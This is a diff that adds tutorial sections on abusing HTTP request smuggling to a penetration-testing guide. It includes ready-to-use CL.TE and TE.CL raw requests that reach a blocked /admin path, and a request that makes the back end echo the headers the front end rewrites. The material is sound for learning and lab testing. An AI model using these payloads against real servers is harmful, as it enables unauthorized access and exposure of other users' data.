@@ -477,3 +477,88 @@ Some front-ends only reuse the upstream connection when the client reuses theirs
     -   Then chain to cache/header-leak/control-bypass primitives and demonstrate cross-user or authorization impact.
  
     -----------------------------
+
+## Abusing HTTP Request Smuggling
+
+
+### Circumventing Front-End Security via HTTP Request Smuggling
+
+>Sometimes, front-end proxies enforce security measures, scrutinizing incoming requests. However, these measures can be circumvented by >exploiting HTTP Request Smuggling, allowing unauthorized access to restricted endpoints. For instance, accessing `/admin` might be prohibited >externally, with the front-end proxy actively blocking such attempts. Nonetheless, this proxy may neglect to inspect embedded requests within >a smuggled HTTP request, leaving a loophole for bypassing these restrictions.
+>
+>Consider the following examples illustrating how HTTP Request Smuggling can be used to bypass front-end security controls, specifically >targeting the `/admin` path which is typically guarded by the front-end proxy:
+
+**CL.TE Example**
+
+```http
+POST / HTTP/1.1
+Host: [redacted].web-security-academy.net
+Cookie: session=[redacted]
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 67
+Transfer-Encoding: chunked
+
+0
+GET /admin HTTP/1.1
+Host: localhost
+Content-Length: 10
+
+x=
+```
+
+In the CL.TE attack, the `Content-Length` header is leveraged for the initial request, while the subsequent embedded request utilizes the `Transfer-Encoding: chunked` header. The front-end proxy processes the initial `POST` request but fails to inspect the embedded `GET /admin` request, allowing unauthorized access to the `/admin` path.
+
+**TE.CL Example**
+
+```http
+POST / HTTP/1.1
+Host: [redacted].web-security-academy.net
+Cookie: session=[redacted]
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+Content-Length: 4
+Transfer-Encoding: chunked
+2b
+GET /admin HTTP/1.1
+Host: localhost
+a=x
+0
+```
+
+Conversely, in the TE.CL attack, the initial `POST` request uses `Transfer-Encoding: chunked`, and the subsequent embedded request is processed based on the `Content-Length` header. Similar to the CL.TE attack, the front-end proxy overlooks the smuggled `GET /admin` request, inadvertently granting access to the restricted `/admin` path.
+
+------------------------------------
+
+### Revealing front-end request rewriting
+
+Applications often employ a **front-end server** to modify incoming requests before passing them to the back-end server. A typical modification involves adding headers, such as `X-Forwarded-For: <IP of the client>`, to relay the client's IP to the back-end. Understanding these modifications can be crucial, as it might reveal ways to **bypass protections** or **uncover concealed information or endpoints**.
+
+To investigate how a proxy alters a request, locate a POST parameter that the back-end echoes in the response. Then, craft a request, using this parameter last, similar to the following:
+
+```http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 130
+Connection: keep-alive
+Transfer-Encoding: chunked
+
+0
+
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+search=
+```
+
+In this structure, subsequent request components are appended after `search=`, which is the parameter reflected in the response. This reflection will expose the headers of the subsequent request.
+
+It's important to align the `Content-Length` header of the nested request with the actual content length. Starting with a small value and incrementing gradually is advisable, as too low a value will truncate the reflected data, while too high a value can cause the request to error out.
+
+This technique is also applicable in the context of a TE.CL vulnerability, but the request should terminate with `search=\r\n0`. Regardless of the newline characters, the values will append to the search parameter.
+
+This method primarily serves to understand the request modifications made by the front-end proxy, essentially performing a self-directed investigation.
+
+----------------------------------------------
+
